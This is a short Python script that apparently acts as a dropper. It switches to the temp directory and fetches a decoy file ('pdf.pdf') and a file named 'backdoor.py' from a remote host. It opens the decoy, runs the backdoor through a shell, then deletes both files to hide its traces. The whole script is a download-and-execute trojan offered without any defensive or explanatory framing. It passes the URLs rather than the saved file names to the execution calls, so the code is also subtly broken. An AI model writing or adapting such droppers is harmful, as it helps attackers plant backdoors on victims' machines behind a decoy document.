#!/usr/bin/env python
import os
import subprocess
import tempfile

import requests


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def run(payload_file, action_file):
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)

    # Image, PDF, etc
    download(payload_file)
    subprocess.Popen(payload_file, shell=True)

    # Main file with logic (exe)
    download(action_file)
    subprocess.call(action_file, shell=True)

    os.remove(payload_file)
    os.remove(action_file)


location = "http://url"
run(location + "pdf.pdf", location + "backdoor.py")
